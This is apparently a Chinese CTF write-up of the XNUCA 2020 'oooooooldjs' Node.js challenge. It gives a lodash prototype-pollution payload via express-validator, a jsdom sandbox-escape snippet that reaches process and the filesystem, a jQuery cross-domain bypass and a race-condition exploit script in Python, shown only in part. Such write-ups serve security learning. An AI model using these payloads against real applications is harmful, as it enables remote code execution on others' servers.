date: 2020-11-13
categories:
- 比赛
tags:
- wp
- web
- ctf
title: XNUCA_2020_oooooooldjs题解
---
# XNUCA_2020_oooooooldjs题解.md



文章首发于[安全客](https://www.anquanke.com/post/id/221388)



题目描述

>`npm audit` may miss something, be careful of the version of `lodash`. There is prototype pollution in `express-validator`, limited but powerful。



npm audit发现lodash有原型链污染漏洞

```
# Run  npm update lodash --depth 2  to resolve 1 vulnerability
                                                              
  Low             Prototype Pollution                         
                                                              
  Package         lodash                                      
                                                              
  Dependency of   express-validator                           
                                                              
  Path            express-validator > lodash                  
                                                              
  More info       https://npmjs.com/advisories/1523      
```



在https://snyk.io/test/npm/express-validator/2.21.0中查看lodash中出现原型链污染的地方，依次下断点

传入json数据:`{"233":123}`发现：

![image1151](https://raw.githubusercontent.com/Explorersss/photo/master/20201031215650.png)



调用了存在原型链污染的set方法，且[233]不为object的键值，在这里可以触发原型链污染

一波测试后得到原型链污染的payload:`{".\"].__proto__[\"crossDomain":{"1":"2"}}`，但是不能控制原型链污染的值



审计题目代码发现，非常有意思的两个地方

1. 显眼的dangerous
   ![image1432](https://raw.githubusercontent.com/Explorersss/photo/master/20201031220029.png)

2. 这里自己实现了数据库的CURD四种方法

学习了一波后发现第一点可以触发RCE

```javascript
const { JSDOM } = require("jsdom");

new JSDOM(`
<body>
  <script>
    const outerRealmFunctionConstructor = Node.constructor;
    const process = new outerRealmFunctionConstructor("return process")();
    const require = process.mainModule.require;

    // Game over!
    const fs = require('fs');
    console.log(fs.readdirSync('.'));
  </script>
</body>
`, { 
  runScripts: "dangerously" 
});
```



在util.js中定义了唯一会用到jsdom的函数



```javascript
const {
	JSDOM
} = require("jsdom")
const {
	window
} = new JSDOM(``, {
	url: originUrl,
	runScripts: "dangerously"
})
// server side `$` XD
const $ = require('jquery')(window)

const requests = async (url, method) => {
	let result = ""
	try {
		result = await $.ajax({
			url: url,
			type: method,
		})

		console.log(result)
	} catch (err) {
		console.log(err)
		result = {
			data: ""
		}
	}

	return result.data
}
```



jquery的ajax有个特性是如果返回的content-type是text/javascript等代表着js脚本，那么便会执行js，结合上面的jsdom从而RCE，但是在低版本的话确实可以这么做，但是在高版本jquery进行了限制，如果是跨域请求便不会执行脚本

调试jquery代码发现：

![image2617](https://raw.githubusercontent.com/Explorersss/photo/master/20201031220811.jpg)



这里会覆盖我们的content-type，继续调试发现设置crossDomain的逻辑

![image2751](https://raw.githubusercontent.com/Explorersss/photo/master/20201031220938.png)

如果s.crossDomain == null就会进入是否跨域的判断

利用前面的原型链污染从而绕过jquery的跨域限制

还剩下一个问题，我们如何传入自己的url

express开着一个中间件限制了我们url,而且也不让更新url类型的数据

```javascript
const middlewares = [
	// should be
	body('*').trim(),
	body('type').if(body('type').exists()).bail().isIn(['url', 'text'])
	.withMessage("type must be `url` or `text`"),
	body('block').if(body('type').exists()).notEmpty()
	.withMessage("no `block` content").bail()
	.if(body('type').isIn(['url'])).isURL({
		require_tld: false
	})
	.custom((value, {
		req
	}) => new URL(value).host === host)
	.withMessage("invalid url!"),
	(req, res, next) => {
		const errors = validationResult(req)
		if (!errors.isEmpty()) {
			return res.status(400).json({
				errors: errors.array()
			})
		}
		next()
	}
]
```



回到我们刚刚说的第二点有趣的地方，这个简单的数据库并不支持事务功能，也就是说删除type和data并不会同时删除是存在一定的时间差的，相关代码如下

```javascript
D(id) {
		let di, dt
		for (const index in this.datas) {
			if (this.datas[index].id === id) {
				dt = this.types[index]
				this.types.splice(index, 1)
				di = index
			}
		}
		if (dt === 'url') {
			requests(this.datas[di].block, "DELETE").finally(()=>{
				this.datas = this.datas.filter((value)=>value.id !== id)
			})
		} else {
			this.datas = this.datas.filter((value)=>value.id !== id)
		}
	}
```



在删除了type后，他进行了一个相当耗时的操作：访问url，之后才删除data，又因为这里是一个链式删除，一个接着一个删除，所有type删除完后它可能才删除一个data

于是有：

```python
import requests
challenge = "http://eci-2ze1whgyeh7v30y5j8yh.cloudeci1.ichunqiu.com:8888"
def insertUrl(url):
    burp0_url = challenge+"/data"
    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"type": "url", "block": url}
    result = {}
    while True:
        try:
            result = requests.post(burp0_url, headers=burp0_headers, data=burp0_data).json()
        except Exception as e:
            continue
        return result

def insertData(data):
    burp0_url = challenge+"/data"
    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"type": "text", "block": data}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return r.json()

def setLongLine(length=2000):
    endId=""
    url = "http://localhost:8888/data/fake-uuid"
    count = 0
    while count < length:
        count+=1
        data = insertUrl(url)
        url = "http://localhost:8888/data/"+data["data"]["id"]
        endId = data["data"]["id"]
```